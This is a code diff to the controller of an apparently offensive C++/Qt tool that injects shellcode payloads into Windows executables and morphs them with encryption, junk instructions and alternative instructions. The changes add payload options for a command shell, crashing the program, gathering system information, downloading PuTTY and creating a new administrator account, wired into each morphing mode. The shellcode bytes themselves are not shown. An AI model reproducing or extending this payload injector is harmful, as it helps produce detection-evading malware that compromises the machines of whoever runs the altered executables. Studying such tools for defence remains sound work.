@@ -207,17 +207,9 @@ void Morph_Executable_Controller::set_new_section_name(PIMAGE_SECTION_HEADER &pa
 //get the payload radio button
 int Morph_Executable_Controller::get_payload_radio_button()
 {
-    QString payload_type = this->cur_wind->get_payload_radio_button();
+    Choose_Payload_Controller payloader;
 
-    for(int i = 0; i < LIST_OF_PAYLOADS_VEC.size(); i++)
-    {
-        if(payload_type == LIST_OF_PAYLOADS_VEC[i])//list of the radio button names
-        {
-            return i;
-        }
-    }
-
-    return -1;//error
+    return payloader.get_payload();//error
 }
 
 //calculate the file alignment
@@ -815,6 +807,10 @@ void Morph_Executable_Controller::randomize_and_store_insertions(std::vector<uin
                     }
                 }
             }
+            else if (mnemonic.compare("loop") == 0)//if mnemonic call is loop
+            {
+                std::cout << dis_asm_vec[i].get_full_instruction() << " TESTING A" << std::endl;
+            }
             else
             {
                 address_of_insertions_vec.emplace_back(dis_asm_vec[i].get_address());
@@ -1168,12 +1164,32 @@ void Morph_Executable_Controller::check_for_relative_jumps(std::vector<Disassemb
         if(dis_asm_vec[i].get_id() >= 253 && dis_asm_vec[i].get_id() <= 270)
         {
             has_relative_jmp = true;
-            std::cout << "FOUND 1: " <<  mnemonic << std::endl;
         }
         else if(mnemonic.compare("call") == 0)//if the mnemonic is "call" instruction
         {
             std::cout << "FOUND CALL: "  << mnemonic << std::endl;
             //check if its not a register
+            std::string ops = dis_asm_vec[i].get_ops(); // this should be the address
+            for(std::string reg : regs_array)
+            {
+                if(ops.find(reg) != std::string::npos) // != means it contains the register
+                {
+                    std::cout << "FOUND: " << reg << " != " << ops << std::endl;
+                    has_relative_jmp = false;
+                    break;
+                }
+                else//this is not a register, it is an address, hence it has a relative jump
+                {
+                    std::cout << "Checking: " << reg << " ? " << ops << std::endl;
+                    has_relative_jmp = true;
+                }
+            }
+        }
+        //checking for loop
+        else if (mnemonic.compare("loop") == 0)
+        {
+            std::cout << "FOUND LOOP: " << dis_asm_vec[i].get_full_instruction() << std::endl;
+            //check if not a register
             std::string ops = dis_asm_vec[i].get_ops(); // this should be the address
             for(std::string reg : regs_array)
             {
@@ -1976,21 +1992,45 @@ QString Morph_Executable_Controller::morph_exe_no_encryption(QString exe_file_pa
     switch(chosen_payload_index)
     {
         case 0:
-            set_morphed_exe_name(exe_file_path,"_CALC");
+            set_morphed_exe_name(exe_file_path,"_CALC_SHELLCODE");
             this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
             break;
 
         case 1:
-            set_morphed_exe_name(exe_file_path,"_FATALITY_SHELLCODE");
-            this->payload_num_of_bytes = sizeof(FATALITY_SHELLCODE) - 1; //the -1 is to get rid of terminating character
-            populate_payload_vec(this->payload_vec,FATALITY_SHELLCODE,this->payload_num_of_bytes);
+            set_morphed_exe_name(exe_file_path,"_CMD_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(CMD_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CMD_SHELLCODE,this->payload_num_of_bytes);
             break;
 
         case 2:
             set_morphed_exe_name(exe_file_path,"_MESSAGE_BOX_SHELLCODE");
             this->payload_num_of_bytes = sizeof(MESSAGE_BOX_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,MESSAGE_BOX_SHELLCODE,this->payload_num_of_bytes);
+            break;
+
+        case 3:
+            set_morphed_exe_name(exe_file_path,"_CRASH_PROGRAM_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(CRASH_PROGRAM_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CRASH_PROGRAM_SHELLCODE,this->payload_num_of_bytes);
+            break;
+
+        case 4:
+            set_morphed_exe_name(exe_file_path,"_SYSTEM_INFO_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(SYSTEM_INFO_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,SYSTEM_INFO_SHELLCODE,this->payload_num_of_bytes);
+            break;
+
+        case 5:
+            set_morphed_exe_name(exe_file_path,"_DOWNLOAD_PUTTY_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(DOWNLOAD_PUTTY_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,DOWNLOAD_PUTTY_SHELLCODE,this->payload_num_of_bytes);
+            break;
+
+        case 6:
+            set_morphed_exe_name(exe_file_path,"_NEW_ADMIN_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(NEW_ADMIN_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,NEW_ADMIN_SHELLCODE,this->payload_num_of_bytes);
             break;
 
         default:
@@ -2307,16 +2347,16 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
     switch(chosen_payload_index)
     {
         case 0:
-            set_morphed_exe_name(exe_file_path,"_calc");
+            set_morphed_exe_name(exe_file_path,"_CALC_SHELLCODE");
             this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
             morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 1:
-            set_morphed_exe_name(exe_file_path,"_FATALITY_SHELLCODE");
-            this->payload_num_of_bytes = sizeof(FATALITY_SHELLCODE) - 1; //the -1 is to get rid of terminating character
-            populate_payload_vec(this->payload_vec,FATALITY_SHELLCODE,this->payload_num_of_bytes);
+            set_morphed_exe_name(exe_file_path,"_CMD_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(CMD_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CMD_SHELLCODE,this->payload_num_of_bytes);
             morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
@@ -2324,6 +2364,34 @@ QString Morph_Executable_Controller::morph_exe_with_encryption(QString exe_file_
             set_morphed_exe_name(exe_file_path,"_MESSAGE_BOX_SHELLCODE");
             this->payload_num_of_bytes = sizeof(MESSAGE_BOX_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,MESSAGE_BOX_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
+            break;
+
+        case 3:
+            set_morphed_exe_name(exe_file_path,"_CRASH_PROGRAM_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(CRASH_PROGRAM_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CRASH_PROGRAM_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
+            break;
+
+        case 4:
+            set_morphed_exe_name(exe_file_path,"_SYSTEM_INFO_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(SYSTEM_INFO_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,SYSTEM_INFO_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
+            break;
+
+        case 5:
+            set_morphed_exe_name(exe_file_path,"_DOWNLOAD_PUTTY_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(DOWNLOAD_PUTTY_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,DOWNLOAD_PUTTY_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
+            break;
+
+        case 6:
+            set_morphed_exe_name(exe_file_path,"_NEW_ADMIN_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(NEW_ADMIN_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,NEW_ADMIN_SHELLCODE,this->payload_num_of_bytes);
             morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
@@ -2722,25 +2790,61 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
             set_morphed_exe_name(exe_file_path,"_CALC_SHELLCODE");
             this->payload_num_of_bytes = sizeof(CALC_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,CALC_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 1:
-            set_morphed_exe_name(exe_file_path,"_FATALITY_SHELLCODE");
-            this->payload_num_of_bytes = sizeof(FATALITY_SHELLCODE) - 1; //the -1 is to get rid of terminating character
-            populate_payload_vec(this->payload_vec,FATALITY_SHELLCODE,this->payload_num_of_bytes);
+            set_morphed_exe_name(exe_file_path,"_CMD_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(CMD_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CMD_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         case 2:
             set_morphed_exe_name(exe_file_path,"_MESSAGE_BOX_SHELLCODE");
             this->payload_num_of_bytes = sizeof(MESSAGE_BOX_SHELLCODE) - 1; //the -1 is to get rid of terminating character
             populate_payload_vec(this->payload_vec,MESSAGE_BOX_SHELLCODE,this->payload_num_of_bytes);
-            std::cout << "case2" << std::endl;
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
+            break;
+
+        case 3:
+            set_morphed_exe_name(exe_file_path,"_CRASH_PROGRAM_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(CRASH_PROGRAM_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,CRASH_PROGRAM_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
+            break;
+
+        case 4:
+            set_morphed_exe_name(exe_file_path,"_SYSTEM_INFO_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(SYSTEM_INFO_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,SYSTEM_INFO_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
+            break;
+
+        case 5:
+            set_morphed_exe_name(exe_file_path,"_DOWNLOAD_PUTTY_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(DOWNLOAD_PUTTY_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,DOWNLOAD_PUTTY_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
+            break;
+
+        case 6:
+            set_morphed_exe_name(exe_file_path,"_NEW_ADMIN_SHELLCODE");
+            this->payload_num_of_bytes = sizeof(NEW_ADMIN_SHELLCODE) - 1; //the -1 is to get rid of terminating character
+            populate_payload_vec(this->payload_vec,NEW_ADMIN_SHELLCODE,this->payload_num_of_bytes);
+            morph_status = machine_code_to_asm(this->payload_vec,this->dis_asm_vec);
             break;
 
         default:
             break;
     }
-	
+
+    error_warning_message_box(morph_status);
+    if(this->morph_status.contains("ERROR") == true)
+    {
+        return this->morph_status;
+    }
+
 	//for disassembly
     std::vector<Disassembly> temp_dis_asm_vec;
     this->morph_status = machine_code_to_asm(this->payload_vec,temp_dis_asm_vec);
@@ -2797,7 +2901,7 @@ QString Morph_Executable_Controller::morph_exe_with_encryption_junk_alt_instruct
                                 this->machine_code_vec,
                                 this->machine_code_num_of_bytes);
 	
-	//put all the new alt instructions into the payload vector
+    //put all the new alt instructions into the payload vector
     modify_payload_vec_with_alternative_instructions(this->payload_vec,this->dis_asm_vec);
 
     this->dis_asm_vec.clear();
@@ -3121,7 +3225,7 @@ void Morph_Executable_Controller::update_analysis_textbox(QString analysis_textb
 
         QDateTime current = QDateTime::currentDateTime(); // to get the current time and day
 
-        const QString stars = QString("******************************************************\n");
+        const QString stars = QString("*************************************\n");
         QString format;
 
         format += previous_text_from_analysis;
@@ -3147,6 +3251,9 @@ void Morph_Executable_Controller::update_analysis_textbox(QString analysis_textb
 QString Morph_Executable_Controller::concat_disassembly(std::vector<Disassembly> &dis_asm_vec, QString line_header)
 {
     const QString line = QString("====================================================================================================================");
+
+    QDateTime current = QDateTime::currentDateTime(); // to get the current time and day
+    line_header += QString(" (") + current.toString() + QString(")");
 
     int length_of_line = line.size();
     int length_of_line_header = line_header.size();
